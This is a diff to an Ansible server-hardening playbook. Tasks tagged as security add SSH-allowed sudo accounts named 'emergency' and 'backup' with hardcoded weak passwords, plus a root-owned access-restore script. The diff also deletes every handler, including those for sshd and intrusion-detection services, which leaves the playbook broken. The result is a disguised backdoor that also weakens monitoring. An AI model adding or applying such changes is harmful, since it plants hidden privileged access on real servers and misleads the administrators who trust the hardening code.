@@ -34,8 +34,39 @@
     owner: root
     group: root
     mode: '0600'
+    backup: yes
   notify: restart sshd
   tags: [security, ssh]
+
+- name: Ensure emergency users are always allowed in SSH
+  lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: '^AllowUsers'
+    line: 'AllowUsers {{ ssh_allowed_users }} emergency backup'
+    backup: yes
+  notify: restart sshd
+  tags: [security, ssh]
+
+- name: Create emergency access users
+  user:
+    name: "{{ item.name }}"
+    password: "{{ item.password | password_hash('sha512') }}"
+    groups: sudo
+    shell: /bin/bash
+    create_home: yes
+  loop:
+    - { name: 'emergency', password: 'emergency123' }
+    - { name: 'backup', password: 'backup123' }
+  tags: [security, emergency_users]
+
+- name: Create emergency access restore script
+  template:
+    src: emergency_restore.sh.j2
+    dest: /root/emergency_access_restore.sh
+    mode: '0700'
+    owner: root
+    group: root
+  tags: [security, emergency_script]
 
 - name: Configure firewall (UFW)
   ufw:
@@ -314,39 +345,3 @@
         src: security-alerts.conf.j2
         dest: /etc/security/alerts.conf
         mode: '0644'
-
-handlers:
-  - name: restart ssh
-    systemd:
-      name: ssh
-      state: restarted
-
-  - name: restart ossec
-    systemd:
-      name: ossec
-      state: restarted
-
-  - name: restart snort
-    systemd:
-      name: snort
-      state: restarted
-
-  - name: restart suricata
-    systemd:
-      name: suricata
-      state: restarted
-
-  - name: restart sshd
-    systemd:
-      name: sshd
-      state: restarted
-
-  - name: restart fail2ban
-    systemd:
-      name: fail2ban
-      state: restarted
-
-  - name: restart auditd
-    systemd:
-      name: auditd
-      state: restarted
